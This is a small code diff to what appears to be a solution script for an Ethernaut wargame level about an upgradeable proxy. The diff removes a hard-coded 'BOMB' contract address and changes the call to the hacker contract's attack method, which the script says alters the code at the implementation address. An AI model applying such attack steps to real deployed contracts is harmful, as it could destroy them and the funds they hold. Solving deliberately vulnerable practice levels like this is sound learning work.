@@ -3,7 +3,7 @@ from .utils.helper import get_level_instance, level_completed, w3
 
 ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
 LEVEL = "0x511A4Af2bCfea61aE2AeBE94D6624Dc94AffA09C"
-BOMB = "0x6A62e5C37Dd41882eF32cB13Ed5634AeDBd3E7c3"
+
 IMPLEMENTATION_SLOT = 0x360894A13BA1A3210667C828492DB98DCA3E2076CC3735A920A3CA505D382BBC
 
 
@@ -28,8 +28,7 @@ def main():
     print(
         f"\n--- Code at implementation address before exploit: {w3.eth.get_code(implementation).hex()} ---\n"
     )
-
-    hacker.attack(BOMB, sender=user)
+    hacker.attack(sender=user)
 
     print(
         f"\n--- Code at implementation address after exploit: {w3.eth.get_code(implementation).hex()} ---\n"
